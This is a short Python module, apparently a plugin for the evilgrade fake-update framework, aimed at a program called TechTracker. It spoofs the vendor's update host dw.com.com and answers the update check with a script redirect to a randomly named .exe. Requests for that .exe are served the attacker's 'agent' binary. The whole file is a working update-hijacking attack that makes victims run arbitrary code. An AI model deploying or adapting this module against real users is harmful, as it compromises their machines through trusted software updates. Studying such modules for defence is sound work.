from modules import ModuleBase


class TechTracker(ModuleBase):
    name = 'TechTracker'
    version = '1.0'
    appver = '< 1.3.1'
    author = ['Francisco Amato < famato +[AT]+ infobytesec.com >']
    description = ''
    vh = '(dw.com.com)'
    options = {
        'rnd1': {
            'val': 'rand_num(5)',
            'hidden': 1,
            'dynamic': 1,
        }
    }
    requests = [{
            'path': '/redir\?edId',
            'type': 'string',
            'method': '',
            'bin': 0,
            'string': '<html><script>window.location="http://dw.com.com/cnetAppupdate<%RND1%>.exe"</script></html>',
            'parse': 1,
            'file': '',
        }, {
            'path': '.exe',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 0,
            'file': ''
        }]